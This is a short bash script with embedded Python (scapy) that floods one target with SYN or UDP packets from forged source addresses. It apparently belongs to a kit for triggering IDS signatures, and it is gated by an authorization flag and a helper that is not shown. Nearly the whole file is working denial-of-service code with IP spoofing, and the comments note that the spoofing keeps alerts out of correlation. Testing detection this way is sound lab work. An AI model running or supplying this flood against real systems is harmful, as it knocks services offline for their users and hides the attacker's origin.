#!/usr/bin/env bash
# spoofed-flood.sh - flood with forged source addresses (scapy).
# Needs: python3 + scapy, root.
# Triggers: sid 1000001 (SYN flood against one destination) or
#           sid 1000010 (UDP flood against one destination). Sources are
#           forged in 198.18.0.0/15, so the sensor marks the alert spoofable
#           and it does not join a correlation chain.
. "$(cd "$(dirname "$0")" && pwd)/_lib.sh"

usage() { cat <<U
Usage: $PROG --i-have-authorization -t TARGET [-m syn|udp] [-p PORT] [-c COUNT]
  -m MODE   syn (default) or udp
  -p PORT   destination port (default 80)
  -c COUNT  packets to send (default 10000)
U
}

TARGET=""; MODE=syn; PORT=80; COUNT=10000
while [ $# -gt 0 ]; do
  case $1 in
    --i-have-authorization) AUTHORIZED=1 ;;
    -t|--target) TARGET=${2:?}; shift ;;
    -m|--mode) MODE=${2:?}; shift ;;
    -p|--port) PORT=${2:?}; shift ;;
    -c|--count) COUNT=${2:?}; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown argument: $1 (see --help)" ;;
  esac
  shift
done

need_tool python3
python3 -c 'import scapy' 2>/dev/null || die "requires scapy (pip install scapy)"
need_root
authorize "$TARGET"
export TARGET MODE PORT COUNT
exec python3 - <<'PY'
import os, random
from scapy.all import IP, TCP, UDP, RandShort, send
t = os.environ["TARGET"]; mode = os.environ["MODE"]
p = int(os.environ["PORT"]); n = int(os.environ["COUNT"])
def spoof():
    return "198.18.%d.%d" % (random.randint(0, 1), random.randint(1, 254))
print(f"spoofed {mode} flood: {n} packets to {t}:{p} from forged 198.18.0.0/15")
for _ in range(n):
    ip = IP(src=spoof(), dst=t)
    pkt = ip/TCP(sport=RandShort(), dport=p, flags="S") if mode == "syn" else ip/UDP(sport=RandShort(), dport=p)
    send(pkt, verbose=0)
PY
